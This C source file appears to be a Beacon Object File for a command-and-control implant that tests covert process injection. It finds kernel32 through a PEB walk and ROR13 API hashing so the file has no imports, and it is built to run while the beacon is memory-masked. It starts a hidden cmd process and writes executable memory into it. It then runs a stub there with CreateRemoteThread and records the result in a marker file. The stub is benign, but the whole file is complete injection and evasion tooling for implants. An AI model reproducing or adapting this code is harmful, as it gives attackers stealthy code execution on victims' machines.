/* P4 inject BOF: self-contained process injection, ZERO imports.
 *
 * Everything resolves at runtime via a PEB walk + ROR13 hashes, so the
 * object has no UNDEF externals: boff.cpp's admission classifies it as a
 * Win32-only BOF and (with GARGLE_NOOK on) it runs INSIDE the masked
 * window - beacon image and tracked heap ciphertext while the injection
 * executes. No beacon API either, so the result goes to a marker file.
 *
 * Flow: spawn a hidden short-lived victim (cmd ping), VirtualAllocEx a
 * page in it, write a 6-byte stub (mov eax,0x2A; ret),
 * CreateRemoteThread + wait, and write C:\Users\Public\bw_inject_marker.txt
 * with the thread exit code - 0x2A proves OUR bytes executed over there.
 *
 * CRT-free discipline (same as bof_empty): cl /O1 /GS- /Zl, no CRT calls
 * (no memset/memcpy/strcpy - loops only), static writable buffers for
 * anything an API must write into. */
#include <windows.h>
#include <intrin.h>

/* satisfy a possible compiler-emitted memset without any CRT import */
void *memset(void *d, int c, size_t n)
{
	unsigned char *p = (unsigned char *)d;
	while (n--)
		*p++ = (unsigned char)c;
	return d;
}

#define BW_H_CREATEPROCESSA       0x16B3FE72UL
#define BW_H_VIRTUALALLOCEX       0x6E1A959CUL
#define BW_H_WRITEPROCESSMEMORY   0xD83D6AA1UL
#define BW_H_CREATEREMOTETHREAD   0x72BD9CDDUL
#define BW_H_WAITFORSINGLEOBJECT  0xCE05D9ADUL
#define BW_H_GETEXITCODETHREAD    0x1B3F95F9UL
#define BW_H_TERMINATEPROCESS     0x78B5B983UL
#define BW_H_CREATEFILEA          0x7C0017A5UL
#define BW_H_WRITEFILE            0xE80A791FUL
#define BW_H_CLOSEHANDLE          0x0FFD97FBUL

typedef struct {
	DWORD cb;
	LPSTR lpReserved;
	LPSTR lpDesktop;
	LPSTR lpTitle;
	DWORD dwX;
	DWORD dwY;
	DWORD dwXSize;
	DWORD dwYSize;
	DWORD dwXCountChars;
	DWORD dwYCountChars;
	DWORD dwFillAttribute;
	DWORD dwFlags;
	WORD  wShowWindow;
	WORD  cbReserved2;
	LPBYTE lpReserved2;
	HANDLE hStdInput;
	HANDLE hStdOutput;
	HANDLE hStdError;
} BW_STARTUPINFOA;

typedef struct {
	HANDLE hProcess;
	HANDLE hThread;
	DWORD  dwProcessId;
	DWORD  dwThreadId;
} BW_PROCESS_INFORMATION;

typedef BOOL    (WINAPI *BW_CREATEPROCESSA)(LPCSTR, LPSTR, void *, void *, BOOL, DWORD, void *, LPCSTR, BW_STARTUPINFOA *, BW_PROCESS_INFORMATION *);
typedef LPVOID  (WINAPI *BW_VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *BW_WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE  (WINAPI *BW_CREATEREMOTETHREAD)(HANDLE, void *, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *BW_WAITFORSINGLEOBJECT)(HANDLE, DWORD);
typedef BOOL    (WINAPI *BW_GETEXITCODETHREAD)(HANDLE, LPDWORD);
typedef BOOL    (WINAPI *BW_TERMINATEPROCESS)(HANDLE, UINT);
typedef HANDLE  (WINAPI *BW_CREATEFILEA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *BW_WRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, void *);
typedef BOOL    (WINAPI *BW_CLOSEHANDLE)(HANDLE);

/* static writable buffers: CreateProcessA writes into lpCommandLine and
 * CreateFileA/WriteFile take plain pointers - nothing const is cast away */
static char g_cmdline[] = "cmd.exe /c ping -n 30 127.0.0.1";
static char g_marker_path[] = "C:\\Users\\Public\\bw_inject_marker.txt";
static char g_msg_ok[] = "INJECT rc=0x2a (remote stub executed)";
static char g_msg_fail[] = "INJECT FAIL";

/* mov eax, 0x2A ; ret - the injected stub */
static const unsigned char g_stub[6] = { 0xB8, 0x2A, 0x00, 0x00, 0x00, 0xC3 };

static unsigned long bw_hash(const char *s)
{
	unsigned long h = 0;
	while (*s) {
		h = (h >> 13) | (h << 19);
		h += (unsigned char)*s++;
	}
	return h;
}

static int bw_wieq(const unsigned short *a, const unsigned short *b)
{
	while (*a && *b) {
		unsigned short ca = *a, cb = *b;
		if (ca >= 'A' && ca <= 'Z') ca += 0x20;
		if (cb >= 'A' && cb <= 'Z') cb += 0x20;
		if (ca != cb) return 0;
		a++; b++;
	}
	return *a == *b;
}

static void *bw_kernel32(void)
{
	unsigned long long peb = __readgsqword(0x60);
	unsigned long long ldr;
	void *cur, *head;
	unsigned short kname[16];
	unsigned __int64 *kq = (unsigned __int64 *)kname;

	ldr = *(unsigned long long *)(peb + 0x18);
	head = (void *)(unsigned long long)(*(unsigned long long *)(ldr + 0x10));

	kq[0] = 0x006E00720065006BULL; /* k e r n */
	kq[1] = 0x00320033006C0065ULL; /* e l 3 2 */
	kq[2] = 0x006C006C0064002EULL; /* . d l l */
	kq[3] = 0;

	cur = *(void **)head;
	while (cur != head) {
		void *base = *(void **)((unsigned char *)cur + 0x30);
		unsigned short *name = *(unsigned short **)((unsigned char *)cur + 0x60);
		if (base != NULL && name != NULL && bw_wieq(name, kname))
			return base;
		cur = *(void **)cur;
	}
	return NULL;
}

static void *bw_exp(void *k32, unsigned long want)
{
	unsigned char *b = (unsigned char *)k32;
	DWORD lf = *(DWORD *)(b + 0x3C);
	unsigned char *nth = b + lf;
	DWORD exp_rva = *(DWORD *)(nth + 0x88);
	DWORD exp_sz = *(DWORD *)(nth + 0x8C);
	unsigned char *ed;
	DWORD *names, *funcs;
	WORD *ords;
	DWORD n, i;

	if (exp_rva == 0)
		return NULL;
	ed = b + exp_rva;
	n = *(DWORD *)(ed + 0x18);
	funcs = (DWORD *)(b + *(DWORD *)(ed + 0x1C));
	names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
	ords = (WORD *)(b + *(DWORD *)(ed + 0x24));
	for (i = 0; i < n; i++) {
		if (bw_hash((const char *)(b + names[i])) == want) {
			DWORD frva = funcs[ords[i]];
			if (frva >= exp_rva && frva < exp_rva + exp_sz)
				return NULL; /* forwarder */
			return b + frva;
		}
	}
	return NULL;
}

static void bw_write_marker(BW_CREATEFILEA pCreateFileA, BW_WRITEFILE pWriteFile,
                            BW_CLOSEHANDLE pCloseHandle, int ok)
{
	HANDLE f = pCreateFileA(g_marker_path, GENERIC_WRITE, 0, NULL,
	                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD written = 0;
	char *msg;
	DWORD len;

	if (f == INVALID_HANDLE_VALUE)
		return;
	msg = ok ? g_msg_ok : g_msg_fail;
	for (len = 0; msg[len]; len++)
		;
	pWriteFile(f, msg, len, &written, NULL);
	pCloseHandle(f);
}

void go(char *args, int len)
{
	void *k32 = bw_kernel32();
	BW_CREATEPROCESSA      pCreateProcessA;
	BW_VIRTUALALLOCEX      pVirtualAllocEx;
	BW_WRITEPROCESSMEMORY  pWriteProcessMemory;
	BW_CREATEREMOTETHREAD  pCreateRemoteThread;
	BW_WAITFORSINGLEOBJECT pWaitForSingleObject;
	BW_GETEXITCODETHREAD   pGetExitCodeThread;
	BW_TERMINATEPROCESS    pTerminateProcess;
	BW_CREATEFILEA         pCreateFileA;
	BW_WRITEFILE           pWriteFile;
	BW_CLOSEHANDLE         pCloseHandle;
	BW_STARTUPINFOA si;
	BW_PROCESS_INFORMATION pi;
	void *remote;
	SIZE_T written = 0;
	HANDLE th = NULL;
	DWORD rc = 0;
	int ok = 0;

	(void)args;
	(void)len;

	if (k32 == NULL)
		return;
	pCreateProcessA     = (BW_CREATEPROCESSA)bw_exp(k32, BW_H_CREATEPROCESSA);
	pVirtualAllocEx     = (BW_VIRTUALALLOCEX)bw_exp(k32, BW_H_VIRTUALALLOCEX);
	pWriteProcessMemory = (BW_WRITEPROCESSMEMORY)bw_exp(k32, BW_H_WRITEPROCESSMEMORY);
	pCreateRemoteThread = (BW_CREATEREMOTETHREAD)bw_exp(k32, BW_H_CREATEREMOTETHREAD);
	pWaitForSingleObject= (BW_WAITFORSINGLEOBJECT)bw_exp(k32, BW_H_WAITFORSINGLEOBJECT);
	pGetExitCodeThread  = (BW_GETEXITCODETHREAD)bw_exp(k32, BW_H_GETEXITCODETHREAD);
	pTerminateProcess   = (BW_TERMINATEPROCESS)bw_exp(k32, BW_H_TERMINATEPROCESS);
	pCreateFileA        = (BW_CREATEFILEA)bw_exp(k32, BW_H_CREATEFILEA);
	pWriteFile          = (BW_WRITEFILE)bw_exp(k32, BW_H_WRITEFILE);
	pCloseHandle        = (BW_CLOSEHANDLE)bw_exp(k32, BW_H_CLOSEHANDLE);
	if (!pCreateProcessA || !pVirtualAllocEx || !pWriteProcessMemory ||
	    !pCreateRemoteThread || !pWaitForSingleObject || !pGetExitCodeThread ||
	    !pCreateFileA || !pWriteFile || !pCloseHandle)
		return;

	/* zero the structs field by field - no memset available */
	si.cb = 0; si.lpReserved = 0; si.lpDesktop = 0; si.lpTitle = 0;
	si.dwX = 0; si.dwY = 0; si.dwXSize = 0; si.dwYSize = 0;
	si.dwXCountChars = 0; si.dwYCountChars = 0; si.dwFillAttribute = 0;
	si.dwFlags = 0; si.wShowWindow = 0; si.cbReserved2 = 0;
	si.lpReserved2 = 0; si.hStdInput = 0; si.hStdOutput = 0; si.hStdError = 0;
	si.cb = sizeof(BW_STARTUPINFOA);
	pi.hProcess = 0; pi.hThread = 0; pi.dwProcessId = 0; pi.dwThreadId = 0;

	if (!pCreateProcessA(NULL, g_cmdline, NULL, NULL, FALSE,
	                     0x08000000 /* CREATE_NO_WINDOW */, NULL, NULL, &si, &pi))
		return;

	remote = pVirtualAllocEx(pi.hProcess, NULL, 0x1000,
	                         0x3000 /* MEM_COMMIT|MEM_RESERVE */,
	                         0x20 /* PAGE_EXECUTE_READ */);
	if (remote != NULL && pWriteProcessMemory(pi.hProcess, remote, g_stub, sizeof(g_stub), &written)) {
		th = pCreateRemoteThread(pi.hProcess, NULL, 0,
		                        (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
		if (th != NULL) {
			pWaitForSingleObject(th, 10000);
			if (pGetExitCodeThread(th, &rc) && rc == 0x2A)
				ok = 1;
		}
	}
	bw_write_marker(pCreateFileA, pWriteFile, pCloseHandle, ok);

	if (th != NULL)
		pCloseHandle(th);
	if (pi.hProcess != NULL) {
		pTerminateProcess(pi.hProcess, 0);
		pCloseHandle(pi.hProcess);
	}
	if (pi.hThread != NULL)
		pCloseHandle(pi.hThread);
}
